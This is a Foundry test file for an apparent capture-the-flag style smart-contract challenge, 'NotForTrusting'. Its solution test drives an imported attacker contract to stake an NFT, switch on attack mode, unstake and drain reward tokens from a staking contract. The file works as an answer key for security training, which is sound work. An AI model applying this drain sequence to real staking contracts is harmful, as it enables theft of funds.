// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import { Test, console } from "forge-std/Test.sol";
import { Staking, Rewarder } from "../src/6_NotForTrusting.sol";
import { NotForTrustingHelper } from "../test_helper/6_NotForTrustingSetup.sol";
import "../mocks/marqToken.sol";
import "../mocks/NFT.sol";

//@todo remove this
import {Attack6} from "../exploits/6_attacker.sol";


contract NotForTrusting is Test {
    Staking public staking;
    Rewarder public rewarder;
    MarqToken public token;
    NFT public nft;
    uint256 tokenId = 0;


    function setUp() public {
        NotForTrustingHelper dontpeak = new NotForTrustingHelper();
        staking = dontpeak.deployed1();
        rewarder = dontpeak.deployed2();
        token = MarqToken(dontpeak.tokenAddress());
        nft = NFT(dontpeak.nftAddress());
    }


 
    // function test_GetThisPassing_6() public {
    //     address hacker = address(0xBAD);
        

    //     vm.startPrank(hacker);
       
    //     vm.stopPrank();

    //     assertGt(token.balanceOf(hacker), 1000 ether);
        // assertEq(nft.ownerOf(tokenId), hacker);
    // }


    // solution
    function test_GetThisPassing_6() public {
        address hacker = address(0xBAD);
        
        //@todo remove this
        Attack6 attack = new Attack6(address(staking), address(rewarder), address(nft), address(token));

        vm.startPrank(hacker);
        console.log(nft.ownerOf(tokenId));
        nft.transferFrom(address(hacker), address(attack), tokenId);
        attack.stake(tokenId);
        attack.setAttackMode(true);
        vm.roll(block.number + 100);
        attack.unstake(tokenId);
        attack.pullOutWinnings(tokenId);
        vm.stopPrank();

        assertGt(token.balanceOf(hacker), 1000 ether);
        assertEq(nft.ownerOf(tokenId), hacker);
    }

}


